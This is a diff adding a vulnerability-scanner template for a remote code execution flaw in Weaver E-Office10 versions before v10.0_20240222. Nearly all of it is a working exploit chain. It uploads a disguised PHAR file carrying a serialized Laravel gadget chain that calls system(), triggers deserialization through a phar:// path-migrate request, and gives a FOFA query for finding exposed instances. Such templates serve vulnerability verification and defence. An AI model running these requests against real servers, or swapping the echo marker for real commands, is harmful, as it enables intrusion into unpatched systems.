@@ -1,0 +1,62 @@
+## id: VEID-2024-0505
+## name: 泛微E-Office10版本小于v10.0_20240222存在远程代码执行漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,rce,veid2024
+## description: 漏洞的关键在于系统处理上传的PHAR文件时存在缺陷。攻击者能够上传伪装的PHAR文件到服务器，利用PHP处理PHAR文件时自动进行的反序列化机制来触发远程代码执行。
+## affects: v10.0_20180516 < E-Office10 < v10.0_20240222
+## fofa-query: app="泛微-EOffice" | body="eoffice_loading_tip" && body="eoffice10"
+## verification: true
+
+
+POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: multipart/form-data; boundary=jzdwsbic
+
+--jzdwsbic
+Content-Disposition: form-data; name="Filedata"; filename="register.inc"
+Content-Type: image/jpeg
+
+GIF89a<?php __HALT_COMPILER(); ?>
+D.....................O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:".*.events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:".*.queueResolver";s:6:"system";}s:8:".*.event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";s:37:"echo 9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P";}}....test.txt....K..f.....~..........test.).i..f3....2pq....>....GBMB
+--jzdwsbic--
+
+#@ stop_scan: true
+#@ condition: and
+#@ matcher: body contains '"status":1' && body contains '"attachment_id":' && body contains '"attachment_name":'
+#@ matcher: status_code == 200
+
+---
+
+POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+
+#@ stop_scan: true
+#@ condition: and
+#@ matcher: body contains '"status":1' && body contains '"data":[' && body contains '"attachment_name"'
+#@ matcher: status_code == 200
+
+---
+
+POST /eoffice10/server/public/api/empower/import HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+type=tttt&file=263bcfcf49019d4735c62653c5cdbd6c
+
+#@ stop_scan: true
+#@ condition: and
+#@ matcher: body contains '"status":' && body contains '"errors":[{' && body contains '"message"'
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: 00ca0e7fbef2033dfb84413ce9b53cbde5e7e077706b2089a63d70e8574ca6ee
